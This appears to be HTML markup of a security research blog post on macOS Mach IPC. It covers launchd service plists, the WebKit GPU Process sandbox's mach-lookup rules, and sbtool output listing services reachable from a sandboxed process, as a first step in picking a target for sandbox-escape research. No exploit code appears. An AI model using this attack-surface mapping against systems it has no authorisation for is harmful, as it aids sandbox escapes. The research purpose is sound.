 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I won&amp;rsquo;t spend too much time detailing the ins and outs of how Mach messages work, (that is better left to a more &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://dmcyk.xyz/post/xnu_ipc_i_mach_messages/&quot;&gt;comprehensive post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;on the subject) but here&amp;rsquo;s a brief overview of Mach IPC for this blog post:&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_isqxjnyw1znn-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Mach messages are stored within kernel-managed message queues, represented by a Mach port&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c14 li-bullet-0&quot;&gt;&lt;span&gt;A process can fetch a message from a given port if it holds the receive right for&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;that port&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;A process can send a message to a given port if it holds a send right to that port&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;MacOS applications can register a service with the bootstrap server, a special mach port which all processes have a send right to by default. This allows other processes to send a Mach message to the bootstrap server inquiring about a specific service, and the bootstrap server can respond with a send right&lt;/span&gt;&lt;span&gt;&amp;nbsp;to that service&amp;rsquo;s Mach port&lt;/span&gt;&lt;span&gt;. MacOS system daemons register Mach services via &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;launchd&lt;/span&gt;&lt;span&gt;. You can view their &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;.plist&lt;/span&gt;&lt;span&gt;&amp;nbsp;files within the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;/System/Library/LaunchAgents&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;/System/Library/LaunchDaemons&lt;/span&gt;&lt;span&gt;&amp;nbsp;directories to get an idea of the services registered. For example, the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;.plist&lt;/span&gt;&lt;span&gt;&amp;nbsp;file below highlights a Mach service registered for the Address Book application on MacOS using the identifier &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;com.apple.AddressBook.AssistantService&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;?xml&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;version=&amp;quot;1.0&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;!DOCTYPE&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;plist&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;PUBLIC&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;-//Apple//DTD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;PLIST&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1.0//EN&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;plist&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;version=&amp;quot;1.0&amp;quot;&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;dict&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;key&amp;gt;POSIXSpawnType&amp;lt;/key&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;string&amp;gt;Adaptive&amp;lt;/string&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;string&amp;gt;com.apple.AddressBook.AssistantService&amp;lt;/string&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;key&amp;gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;MachServices&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;/key&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;dict&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;key&amp;gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;com.apple.AddressBook.AssistantService&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;/key&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;true/&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;/dict&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;array&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;string&amp;gt;/System/Library/Frameworks/AddressBook.framework/Versions/A/Helpers/ABAssistantService.app/Contents/MacOS/ABAssistantService&amp;lt;/string&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;/array&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;/dict&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;lt;/plist&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.en4g4aihouqm&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Choose a Target&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;After deciding I wanted to research Mach services, the next question was which service to target. In order for a sandboxed process to send Mach messages to a service, it has to be explicitly allowed. If the process is using Apple&amp;rsquo;s App Sandbox feature, this is done within a &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;.sb&lt;/span&gt;&lt;span&gt;&amp;nbsp;file, written using the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://tinyscheme.sourceforge.net/home.html&quot;&gt;TinyScheme&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;format&lt;/span&gt;&lt;span&gt;. The snippet below shows an excerpt of the sandbox file for a WebKit GPU Process. The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;allow mach-lookup&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;directive is used to allow a sandboxed process to lookup and send Mach messages to a service.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;# File: /System/Volumes/Preboot/Cryptexes/Incoming/OS/System/Library/Frameworks/WebKit.framework/Versions/A/Resources/com.apple.WebKit.GPUProcess.sb&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(with-filter&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(system-attribute&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;apple-internal)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;allow&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;mach-lookup&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.analyticsd&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.diagnosticd&amp;quot;)))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;allow&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;mach-lookup&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.audio.audiohald&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.CARenderServer&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.fonts&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.PowerManagement.control&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.trustd.agent&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;com.apple.logd.events&amp;quot;))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;This helped me narrow my focus significantly from all MacOS processes, to processes with a sandbox-accessible Mach service:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKaMJWodOlbnpNWUoO_w2aruFUMOM9hBiikTZgtmZUSbBSjnUwyuvenHYHqP0v9DW4d6XHlL6js18baO4KxKpq-_prTYvwI4Yi6BBFUUnAs6uMWyZzlhHhfYnFsvJMSQv8FEdLwDvZbfGekDMvn66A3ppWT1KM59qlwYxws9Wli81XsOJC7rf6Uz8V8oc/s774/image3.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKaMJWodOlbnpNWUoO_w2aruFUMOM9hBiikTZgtmZUSbBSjnUwyuvenHYHqP0v9DW4d6XHlL6js18baO4KxKpq-_prTYvwI4Yi6BBFUUnAs6uMWyZzlhHhfYnFsvJMSQv8FEdLwDvZbfGekDMvn66A3ppWT1KM59qlwYxws9Wli81XsOJC7rf6Uz8V8oc/s774/image3.png&quot; border=&quot;0&quot; alt=&quot;A Venn diagram illustrating process types on macOS. The outermost, largest oval represents All MacOS Processes. Within it, a smaller oval represents Processes with a Mach Service. The innermost, smallest oval represents Processes with a Sandbox Allowed Mach Service, indicating a subset of processes with increasing restrictions and specific Mach service permissions.&quot; style=&quot;max-height: 750px; max-width: 400px;&quot;title=&quot;A Venn diagram illustrating process types on macOS. The outermost, largest oval represents All MacOS Processes. Within it, a smaller oval represents Processes with a Mach Service. The innermost, smallest oval represents Processes with a Sandbox Allowed Mach Service, indicating a subset of processes with increasing restrictions and specific Mach service permissions.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In addition to inspecting the sandbox profiles, I used Jonathan Levin&amp;rsquo;s &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://web.archive.org/web/20240519054616/https://newosxbook.com/src.jl?tree%3Dlistings%26file%3D/sbtool.c&quot;&gt;sbtool&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;utility to test which Mach services could be interacted with for a given process. The &lt;/span&gt;&lt;span&gt;tool&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which was a bit outdated, but I was able to get it to compile) uses the builtin &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;sandbox_exec&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;function under the hood to provide a nice list of accessible Mach service identifiers:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;#10095;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;./sbtool&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;2813&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;mach&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.logd&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.xpc.smd&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.remoted&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.metadata.mds&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.coreduetd&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.apsd&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.coreservices.launchservicesd&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.bsd.dirhelper&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;com.apple.logind&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;com.apple.revision&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;hellip;Truncated&amp;hellip;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/p&gt;
